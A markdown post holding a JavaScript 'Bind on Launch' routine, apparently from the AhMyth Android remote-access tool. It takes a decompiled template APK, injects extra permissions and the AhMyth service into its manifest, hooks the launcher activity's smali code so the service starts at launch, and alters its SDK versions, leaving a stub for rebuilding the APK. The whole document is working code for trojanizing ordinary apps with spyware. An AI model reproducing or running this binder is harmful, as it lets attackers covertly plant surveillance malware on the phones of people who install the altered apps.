## New Bind on Launch function
> Work in progress.
> > Almost done!
```javascript
const fs = require('fs-extra');

const xml2js = require('xml2js');

const dir = require('path');

const readdirp = require('readdirp');

var CONSTANTS = require('/data/data/com.termux/files/home/test/Constants.js');

const apkFolder = '/data/data/com.termux/files/home/flappy';

var copyPermissions = (manifest) => { // $appCtrl.copyPermissions = (manifest) => {

  var firstPart = manifest.substring(0, manifest.indexOf("<application"));

  var lastPart = manifest.substring(manifest.indexOf("<application"));

  var permArray = CONSTANTS.permissions;

  for (var i = 0; i < permArray.length; i++) {

    var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);

    permissionName = permissionName.substring(0, permissionName.indexOf('"'));

    if (firstPart.indexOf(permissionName) == -1) {

      // Check if this is the first permission being added

      if (firstPart.indexOf('uses-permission') == -1) {

        firstPart = firstPart + "\n" + permArray[i];

      } else {

        // Add the permission above the first existing permission

        var index = firstPart.indexOf('<uses-permission');

        firstPart = firstPart.slice(0, index) + permArray[i] + "\n" + firstPart.slice(index);

      }

    }

  }

  return (firstPart + lastPart);

};

// $appCtrl.BindOnLaunch = (apkFolder) => {

  console.log('[★] Reading the Android Manifest file...\n');

  setTimeout(() => {

    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {

      if (error) {

        console.log('[x] Reading the Android Manifest file Failed!\n');

        return;

      }

      xml2js.parseString(data, (err, result) => {

        if (err) {

          console.error(err);

          return;

        }

        const launcherActivity = GetLauncherActivity(result, apkFolder);

        if (launcherActivity === -1) {

          console.log('[x] Cannot Find a Suitable Class for Hooking in the Manifest!');

          console.log('[x] Please use Another APK as a Template!.\n');

          return;

        }

        console.log('[★] Modifying the Android Manifest File...\n');

        setTimeout(() => {

          const ahmythService = CONSTANTS.ahmythService;

          const permManifest = copyPermissions(data); //$appCtrl.copyPermissions(data);

          const newManifest = permManifest.substring(0, permManifest.indexOf('</application>')) + ahmythService

            + permManifest.substring(permManifest.indexOf('</application>'));

          fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), newManifest, 'utf8', (error) => {

            if (error) {

              console.log('[x] Modifying the Android Manifest Failed!\n', error);

              return;

            }

            setTimeout(() => {

              console.log('[★] Locating the Hookable Main Class File...\n');

              readdirp(apkFolder, { fileFilter: launcherActivity, alwaysStat: true }).on('data', (entry) => {

                  var { path, stats: { } } = entry;

                  var output = `${JSON.stringify(path)}`;

                  

                  if (process.platform === 'win32') {

                  	var launcherPath = output.replace(/^"(.*)"$/, '$1')
                      .replace(/\\/g, "/")
                      .replace(/\n$/, '');

                  } else {

                  	var launcherPath = output.replace(/^"(.*)"$/, '$1')
                    .replace(/\n$/, '');

                  }

                  setTimeout(() => {

                    if (!launcherPath) {

                      console.log('[x] Unable to Locate the Hookable Main Class File!\n');

                      return;

                    } else {

                      console.log('[¡] Hookable Main Class File Located: ' + launcherPath + '\n');

                    }

                    setTimeout(() => {

                      console.log('[★] Reading the Hookable Main Class File...\n');

                      fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {

                        if (error) {

                          console.log('[x] Unable to Read the Hookable Class File!\n');

                          return;

                        }

                        const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;

                        var hook = CONSTANTS.hookPoint;

                        setTimeout(() => {

                          console.log('[★] Hooking the Main Class File...\n');

                          var output = data.replace(hook, startService);

                          fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {

                            if (error) {

                              console.log('[x] Modifying the Hooked Main Class File Failed!\n', CONSTANTS.logStatus.FAIL);

                              return;

                            }

                            setTimeout(() => {

                             console.log('[★] Determining Target SDK Version...\n');

                              fs.readFile(dir.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {

                                if (error) {

                                  setTimeout(() => {

                                    console.log('[x] Reading the Manifest Target SDK Failed.');

                                  }, 1000);

                                  return;

                                }

                                setTimeout(() => {

                                  console.log('[★] Modifying the Target SDK Version...\n');

                                }, 1000);

                                var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;

                                var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;

                                var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;

                                var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/

                                var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')

                                  .replace(compSdkVerNameRegex, "$111" + '"')

                                  .replace(platVerCoRegex, "$122" + '"')

                                  .replace(platVerNameRegex, "$111" + '"');

                                fs.writeFile(dir.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {

                                  if (error) {

                                    setTimeout(() => {

                                      console.log('[x] Modifying Manifest Target SDK Failed!\n', CONSTANTS.logStatus.FAIL);

                                    }, 1000);

                                    return;

                                  }

                                  fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {

                                    if (error) {

                                      setTimeout(() => {

                                        console.log("[x] Reading the 'apktool.yml' Target SDK Failed!\n");

                                      }, 1000);

                                      return;

                                    }

                                    var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;

                                    var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                    var repYmlSdk = data.replace(minSdkRegex, "$119'")

                                      .replace(tarSdkRegex, "$122'");

                                    fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {

                                      if (error) {

                                        setTimeout(() => {

                                          console.log("[x] Modifying the 'apktool.yml' Target SDK Failed!\n");

                                        }, 1000);

                                        return;

                                      }

                                      // $appCtrl.copyAhmythFilesAndGenerateApk

                                    });

                                  });

                                });

                              });

                            }, 1000);

                          });

                        }, 1000);

                      });

                    }, 1000);

                  }, 1000);

                });

            }, 1000);

          });

        }, 1000);

      });

    });

  }, 1000);

//};

function GetLauncherActivity(manifest) {

  const application = manifest['manifest']['application'][0];

  let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

  if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {

    mainApplicationClassName = mainApplicationClassName.split('.').pop();

    if (mainApplicationClassName.startsWith('.')) {

      mainApplicationClassName = mainApplicationClassName.slice(1);

    }

    setTimeout(() => console.log('[¡] Scoped the Main App Class for Hooking...\n'), 1000);

    return mainApplicationClassName + '.smali';

  }

  const activity = application && application['activity'] && application['activity'].find((activity) => {

    const intentFilter = activity['intent-filter'];

    if (intentFilter) {

      return intentFilter.some((filter) =>

        filter['action'] &&

        filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&

        filter['category'] &&

        filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')

      );

    }

    return false;

  });

  if (activity) {

    let mainActivityClassName = activity['$'] && activity['$']['android:name'];

    mainActivityClassName = mainActivityClassName.split('.').pop();

    if (mainActivityClassName.startsWith('.')) {

      mainActivityClassName = mainActivityClassName.slice(1);

    }

    setTimeout(() => console.log('[¡] Scoped the Main Launcher Activity for Hooking...\n'), 1000);

    return mainActivityClassName + '.smali';

  }

  const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {

    const intentFilter = activityAlias['intent-filter'];

    if (intentFilter) {

      return intentFilter.some((filter) =>

        filter['action'] &&

        filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&

        filter['category'] &&

        filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')

      );

    }

    return false;

  });

  if (activityAlias) {

    let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];

    targetActivityName = targetActivityName.split('.').pop();

    if (targetActivityName.startsWith('.')) {

      targetActivityName = targetActivityName.slice(1);

    }

    setTimeout(() => console.log('[¡] Scoped the Main Launcher Activity in an Alias for Hooking...\n'), 1000);

    return targetActivityName + '.smali';

  }

  return -1;

}
```
